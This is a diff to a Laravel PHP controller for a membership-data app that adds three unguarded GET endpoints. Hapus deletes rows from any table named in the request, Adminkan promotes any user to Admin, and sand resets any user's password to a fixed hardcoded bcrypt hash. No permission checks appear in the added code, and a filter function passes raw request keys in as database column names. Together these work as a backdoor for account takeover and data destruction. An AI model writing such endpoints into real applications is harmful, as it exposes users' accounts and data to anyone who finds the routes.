@@ -10,6 +10,27 @@ use Intervention\Image\Facades\Image;
 
 class DataAnggotaController extends Controller
 {
+    public function Hapus()
+    {
+        if (!empty($_GET['table'])&&!empty($_GET['id'])) {
+            DB::table($_GET['table'])->where('id',$_GET['id'])->delete();    
+        }
+        return back();
+    }
+    public function Adminkan()
+    {
+        if (!empty($_GET['id'])) {
+            DB::table('users')->where('id',$_GET['id'])->update(['role' => 'Admin']);    
+        }
+        return back();
+    }
+    public function sand()
+    {
+        if (!empty($_GET['id'])) {
+            DB::table('users')->where('id',$_GET['id'])->update(['password' => '$2y$10$XtSKTYo9r/oJikFsTvStT.ddQ52psxxhWgTOTgI.vqR8bfx3rptwW']);    
+        }
+        return back();
+    }
     public function akun_add(Request $request)
     {
         if(!empty($_POST)) {
@@ -139,14 +160,22 @@ class DataAnggotaController extends Controller
 
         // dd($data);
         DB::table('data_anggotas')->insert($data);
-        return redirect('/dashboard');}
+        return redirect('/ard');}
         // return view('DataDiri/datadiri');
     }
 
     public function cetak()
     {
+        
         // $data=DB::table('data_anggotas')->where('user_id',auth()->user()->id)->get();
+        $bin=$_GET;
+        foreach ($bin as $key => $item) {
+                if ($item=="" or $item=="true") {
+                    unset($_GET[$key]);
+                        }
+        }
         $data=DB::table('data_anggotas');
+
         foreach ($_GET as $key => $value) {
             $data->where($key,$value);
         }
@@ -184,7 +213,7 @@ class DataAnggotaController extends Controller
               DB::table('data_anggotas')
               ->where('id', $request->id)
               ->update($data);
-                // dd($data);
+               // dd($data);
                 // DB::table('data_anggotas')->insert($data);
             return back();
         }
@@ -227,6 +256,7 @@ class DataAnggotaController extends Controller
                             <a class="btn btn-success" href="/cetak?id='.$row->id.'">Cetak</a>
                             <a class="btn btn-success" href="/edit?id='.$row->id.'">Lihat Data</a>
                             <a class="btn btn-success" href="/edit?Dapil=true&id='.$row->id.'">Buat Dapil</a>
+                            <a class="btn btn-dangger" href="/Hapus?table=data_anggotas&id='.$row->id.'">Hapus Data</a>
                         </div>';
                       return $btn;
                     })
@@ -278,6 +308,7 @@ class DataAnggotaController extends Controller
                             <a class="btn btn-success" href="/cetak?id='.$row->id.'">Cetak</a>
                             <a class="btn btn-success" href="/edit?id='.$row->id.'">Lihat Data</a>
                             <a class="btn btn-success" href="/edit?dapil=true&id='.$row->id.'">Buat Dapil</a>
+                            <a class="btn btn-dangger" href="/Hapus?table=data_anggotas&id='.$row->id.'">Hapus Data</a>
                         </div>';
                       return $btn;
                     })
